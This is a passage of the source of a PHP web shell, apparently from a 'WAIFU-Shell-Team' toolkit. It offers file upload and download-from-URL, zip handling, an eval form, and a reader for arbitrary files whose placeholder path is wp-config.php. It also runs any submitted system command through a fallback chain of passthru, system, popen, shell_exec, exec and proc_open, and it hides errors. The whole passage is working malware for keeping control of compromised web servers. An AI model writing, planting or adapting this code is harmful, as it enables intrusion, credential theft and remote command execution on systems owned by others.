        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::LEAVES_ONLY);
        foreach ($files as $file) {
            if (!$file->isDir()) {
                // Get real path of current file
                $filePath = $file->getRealPath();
                // Relative path for ZIP
                $relativePath = substr($filePath, strlen($source) + 1);
                // Add file to ZIP
                $zip->addFile($filePath, $relativePath);
            }
        }
    } elseif (is_file($source)) {
        $zip->addFile($source, basename($source));
    } else {
        echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Compressed Failed!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
    }

    $zip->close();
    echo "  <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'Compressed successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
}


function compressFolderform($dir)

{
    if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['compress-form'])) {
        $pler = dirkentod($dir);
        $escapedPler = htmlspecialchars(strip_tags($pler));
        echo"
        <br />
            <style>
                table {
                    display: none;
                }
            </style>
        <center>
    <br>
    <div class='execution-box'>
        <form method='post' action=''>
            <label for='sourceDir'><h2>| Compress |</h2></label><br>
            Dir/File: <input type='text' id='sourceDir' name='sourceDir' value='" . $escapedPler . "'>
            Save Dir: <input type='text' id='destinationZip' name='destinationZip' value='' . $escapedPler . 'lutfifakee'>
            <input type='submit' name='compress' value='Compress'>
        </form>
        <br>
        <br>
        <br>
        </div>
    </center>";



    }
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['compress'])) {
        $sourceDir = isset($_POST['sourceDir']) ? $_POST['sourceDir'] : '';
            $destinationZip = isset($_POST['destinationZip']) ? $_POST['destinationZip'] : '';
        
            $sourceDir = rtrim($sourceDir, '/\\') . '/';
            $destinationZip = rtrim($destinationZip, '/\\') . '.zip';
        
            compressFolder($sourceDir, $destinationZip);
        }
    }

function decompressFolder($sourceZip, $destination) {
        $zip = new ZipArchive();
        if ($zip->open($sourceZip) !== TRUE) {
            echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'DeCompressed Failed!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        }
    
        $zip->extractTo($destination);
        $zip->close();
         echo "  <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'DeCompressed successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
    }
    
function decompressFolderForm($dir)
    {
        if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['decompress-form'])) {
            $pler = dirkentod($dir);
            $escapedPler = htmlspecialchars(strip_tags($pler));
            echo    '
            <br />
            <style>
                table {
                    display: none;
                }
            </style>
            <center>
        <br>
        <div class="execution-box">
            <form method="post" action="">
                <label for="sourceDir"><h2>| DeCompress |</h2></label><br>
                File: <input type="text" id="sourceZip" name="sourceZip" value="' . $escapedPler . '">
                Extract To: <input type="text" id="destinationDir" name="destinationDir" value="' . $escapedPler . '">
                <input type="submit" name="decompress" value="Decompress">
                </form>
            <br>
            <br>
            <br>
            </div>
                </center>';
        }
    
        if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['decompress'])) {
            $sourceZip = isset($_POST['sourceZip']) ? $_POST['sourceZip'] : '';
            $destinationDir = isset($_POST['destinationDir']) ? $_POST['destinationDir'] : '';
            $destinationDir = rtrim($destinationDir, '/\\') . '/';

            if (!empty($sourceZip) && !empty($destinationDir)) {
                decompressFolder($sourceZip, $destinationDir);
            } else {
                echo "Source ZIP file and destination directory paths cannot be empty.";
            }
        }
    }

?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($host . " - " . $additional_title); ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-..." crossorigin="anonymous" />
    <link rel="preload" href="https://cdn.jsdelivr.net/gh/X-Projetion/WAIFU-Shell-Team@main/nemofm.jpg" as="image">
    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css'>
    <script src='https://cdn.jsdelivr.net/npm/sweetalert2@11'></script>
    <link rel="icon" type="image/x-icon" href="https://avatars.githubusercontent.com/u/161194427?v=4&size=64">
    <link rel="apple-touch-icon" sizes="180x180" href="https://avatars.githubusercontent.com/u/161194427?v=4&size=64">
    <link rel="icon" type="image/png" sizes="32x32" href="https://avatars.githubusercontent.com/u/161194427?v=4&size=64">
    <link rel="icon" type="image/png" sizes="16x16" href="https://avatars.githubusercontent.com/u/161194427?v=4&size=64">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/X-Projetion/css/okeh.css">
    <style>

        .table-wrapper {
            width: 45%; /* Sesuaikan dengan lebar tabel */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            background-color: #333;
        }

        .table-container {
            padding: 10px;
            background-color: #333;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }

        .table-container table {
            width: 100%;
            border-collapse: collapse;
        }

        /* CSS untuk tabel sudah ada di tempat lain */
    </style>
</head>
<body>
    <div class="container">
        <h1><?php echo htmlspecialchars($host) . " - " . htmlspecialchars($additional_title); ?></h1>
        <h2>Hack the future, code the dream, and break the boundaries.</h2>
        <?php 
        error_reporting(0);
        ini_set('display_errors', 0);
        ini_set('display_startup_errors', 0);
        displayServerInfo(); 
        ?>
        <script>
            function toggleInfo(id) {
                var element = document.getElementById(id);
                if (element.style.display === 'none') {
                    element.style.display = 'block';
                } else {
                    element.style.display = 'none';
                }
            }
        </script>
        <center> <div class="box-filtur"> <a href="?eval-form=1" class="button-neon">Eval Gank</a> <span class="separator">|</span> <a href="?compress-form" class="button-neon">Compress</a> <span class="separator">|</span> <a href="?decompress-form" class="button-neon">Decompress</a> <span class="separator">|</span> </div> </center>
        <br><div style='text-align: right;'><a href='?dir=<?php echo htmlspecialchars($dir); ?>&wibu=createfile' class='button-neon'>Create File</a></div>

        <div class='execution-box'> <form method='post'> <input type='text' id='terminal' name='url' placeholder='https://lutfifakee.com/file.txt'> <button type='submit' name='uploadurl'><i class='fas fa-play submit-icon'></i></button> </form> </div>
        <br>
        <br>
        <div class="upload-wrapper"> <form method="post" enctype="multipart/form-data"> <input type="file" id="file-upload" class="file-input" name="upfile"> <label for="file-upload" class="upload-button"> <i class="fas fa-upload"></i> <span>Select File</span> </label> <button type="submit" name="up" id="upload-button" class="upload-button" disabled>Upload</button> </form> </div>

<script>
    const fileInput = document.querySelector("#file-upload");
    const uploadButton = document.querySelector("#upload-button");

    fileInput.addEventListener("change", function() {
        if (this.files.length > 0) {
            uploadButton.disabled = false;
        } else {
            uploadButton.disabled = true;
        }
    });
</script>
<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);

        if (isset($_POST['up'])) {
            $uploadfile = $_FILES['upfile']['name'];
            if (move_uploaded_file($_FILES['upfile']['tmp_name'], $dir . '/' . $_FILES['upfile']['name'])) {
                echo "<br>File was successfully uploaded ! ";
            } else {
                echo "<br>Upload failed ! ";
            }
        }
        echo '<br>';
        echo generateDirectoryLinks($dir);
        echo "</font>";

        echo " [<a style='color:red;' href='?'> HOME </a>]";
        $path = isset($_GET['path']) ? $_GET['path'] : '';

        echo "<table>
                <tr>
                <th>File/Folder Name</th>
                <th>Capacity</th>
                <th>Access Status</th>
                <th>Modification Date</th>
                 <th>Owner and Group</th>
                <th>Operations</th>
                </tr>";
        showFiles($dir);
        echo "</table>";

        if (isset($_GET['wibu']) && $_GET['wibu'] == 'createfile') {
            createFileForm($dir);
        }
        createFile($dir);
        createFolder($dir);

        deleteFile($dir);
        deleteFolder($dir);
        renameFile($dir);
        editFile($dir);
        evalgankform($dir);
        

        compressFolderform($dir);
        decompressFolderForm($dir);


        if (isset($_GET['change_datetime'])) {
            $path = $_GET['change_datetime'];
            displayChangeDatetimeForm($path);
        }

        if (isset($_GET['change_Permission'])) {
            $file_to_change = $_GET['change_Permission'];
            postpermissions($file_to_change);
        }
        echo createFolderForm($dir);

?>
<br>
<br>
<div style="float: right;" class='execution-box'>
<form method="post" action="">
        <label for="filenamex">Readfile Command:</label><br>
        <input type="text" id="filenamex" name="filenamex" placeholder="/home/lutfifakee/public_html/wp-config.php">
        <button type="submit"><i class="fas fa-play"></i> Run</button>
    </form>
    </div>
    <br>
<br>
<br><br>
<br>
<br>
    <?php
    error_reporting(0);
    ini_set('display_errors', 0);
    ini_set('display_startup_errors', 0);
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['filenamex'])) {
        $filenamex = $_POST['filenamex'];
        if (file_exists($filenamex)) {
            echo "<p>Path File yang dibuka: <strong>" . htmlspecialchars($filenamex) . "</strong></p>";
            $file = fopen($filenamex, 'r');
            if ($file) {
                echo "<center><br><br><br><textarea rows='20' cols='100' readonly>";
                while (($line = fgets($file)) !== false) {
                    echo htmlspecialchars($line);
                }
                echo "</textarea><br><br></center>";
                fclose($file);
            } else {
                echo "<center><br><br><br><textarea rows='20' cols='100' readonly>Gagal membuka file.</textarea><br><br></center>";
            }
        } else {
            echo "<center><br><br><br><textarea rows='20' cols='100' readonly>File tidak ditemukan.</textarea><br><br></center>";
            
        }
    }
    ?>

<br>
<center>
<div class="execution-box">
    <form method="POST" action="">
        <label for="terminal">Command Line Interface</label>
        <p><?php echo generateDirectoryLinks($dir); ?></p>
        <input type="text" name="terminal" id="terminal" placeholder="wget https://Lutfifakee.org/file.txt -O file.php">
        <button type="submit"><i class="fas fa-play submit-icon"></i> Run</button>
    </form>
</div>

<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
$baseDir = getcwd();
$selectedDir = isset($_GET['dir']) ? $_GET['dir'] : $baseDir;
$selectedDir = str_replace("\\", "/", $selectedDir);
$baseDir = str_replace("\\", "/", $baseDir);
if (strpos(realpath($selectedDir), realpath($baseDir)) !== 0) {
    $selectedDir = $baseDir;
}

$directoryLinks = generateDirectoryLinks($selectedDir);

$output = '';
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['terminal'])) {
    $command = trim($_POST['terminal']);

    function getOS() {
        $os = strtolower(PHP_OS);
        if (strpos($os, 'win') === 0) {
            return 'windows';
        } elseif (strpos($os, 'linux') === 0) {
            return 'linux';
        } else {
            return 'unknown';
        }
    }

    function executeTerminal($command, $directory) {
        chdir($directory);
        
        $os = getOS();
        if ($os == 'windows') {
            $command = str_replace('/', '\\', $command);
        }

        if (function_exists('passthru')) {
            ob_start();
            passthru($command, $return_var);
            $output = ob_get_clean();
            return $output;
        } elseif (function_exists('system')) {
            ob_start();
            system($command, $return_var);
            $output = ob_get_clean();
            return $output;
        } elseif (function_exists('popen')) {
            $handle = popen($command, 'r');
            $output = '';
            if ($handle) {
                while (!feof($handle)) {
                    $output .= fread($handle, 1024);
                }
                pclose($handle);
            } else {
                $output = "Failed to open process with popen.";
            }
            return $output;
        } elseif (function_exists('shell_exec')) {
            return shell_exec($command);
        } elseif (function_exists('exec')) {
            exec($command, $output, $return_var);
            return implode("\n", $output);
        } elseif (function_exists('proc_open')) {
            $process = proc_open($command, [1 => ['pipe', 'w']], $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                proc_close($process);
                return $output;
            } else {
                return "Failed to execute process with proc_open.";
            }
        } else {
            return "No command execution functions available.";
        }
    }

    $output = executeTerminal($command, $selectedDir);
    echo "<center><br><br><br><textarea rows='20' cols='100'>" . htmlspecialchars($output) . "</textarea><br><br></center>";
}
?>

</center>

        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <footer>
            <p>&copy; 2024 - K!ngW | <a href="https://hackncorp.my.id/">Lutfifakee768</a>. Where code meets creativity. All rights reserved.</p>
        </footer>

    </div>

</body>
</html>
